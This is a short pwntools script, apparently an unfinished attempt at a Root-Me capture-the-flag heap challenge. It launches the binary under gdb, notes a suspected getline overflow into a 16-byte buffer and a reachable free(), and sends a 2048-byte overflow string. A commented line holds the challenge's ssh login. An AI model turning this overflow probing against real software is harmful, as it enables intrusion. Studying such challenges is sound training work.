from pwn import *
import time

# Load Environment
context.terminal = ['tmux','splitw' ,'-h']
#elf = ELF("./ch86")
#libc = ELF("./libc.so.6")
#ld_preload = {"LD_PRELOAD": ""}

'''
add() - Music Title FAIL program flow leads to free(titleMemAlloc).
user input of 0xffffffffffff(-1) will enter desired program flow to perform free()
Heap filling suggests heap overflow exploitation, explore that.
titleLength = 2028


Read from STDIN, 2048 bytes, place it into titleMemAlloc = (char **)malloc(16): OVERFLOW?
getTitle = getline(titleMemAlloc,&titleLength,stdin)

'''

#s = ssh(host='challenge03.root-me.org', user='app-systeme-ch86', password='app-systeme-ch86', port=2223)
#p = s.process('./ch86')
p = gdb.debug('./ch86', '''
b *main
b *add+146
''')

# songTitle 1 & Genre 1
p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(b'A' * 2048)
p.recvline()
p.sendline(b'1')


# songTitle 2 & Genre 2
'''p.recvline()
p.sendline(b'1')
p.recvline()
p.sendline(b'B' * 2048)
p.recvline()
p.sendline(b'2')
'''
# Delete songTitle 1
'''p.recvline()
p.sendline(b'2')
p.recvline()
p.sendline(b'0')
'''

p.interactive()
